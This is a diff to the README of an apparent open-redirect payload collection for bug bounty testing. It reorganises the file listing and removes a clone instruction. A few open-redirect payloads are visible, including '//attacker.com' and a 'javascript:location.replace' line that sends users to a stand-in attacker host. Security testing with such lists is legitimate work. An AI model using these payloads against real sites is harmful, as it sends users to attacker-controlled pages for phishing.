@@ -23,14 +23,8 @@ An Open Redirect vulnerability occurs when a web application allows an attacker 
 ```
 open-redirect-payloads/
 │
-├── basic.txt
-├── url-encoded.txt
-├── double-encoded.txt
-├── path-traversal.txt
-├── javascript-based.txt
-├── data-uri.txt
-├── bypass-techniques.txt
-└── README.md
+├── Open-Redirect-Payloads.txt
+
 ```
 
 ---
@@ -67,7 +61,7 @@ Use the payloads for testing Open Redirect vulnerabilities in your bug bounty an
 
 ---
 ## 📦 Payloads
-Clone the repository:
+
 ```bash
 https://attacker.com
 //attacker.com
@@ -367,7 +361,6 @@ javascript:location.replace('https://attacker.com')
 ## ⚠️ Disclaimer
 This repository is intended for educational and ethical purposes only. The author is not responsible for any misuse of the information provided.
 
----
 
 ## 🤝 Contributing
 Contributions are welcome! Feel free to submit a pull request with new payloads or improvements.
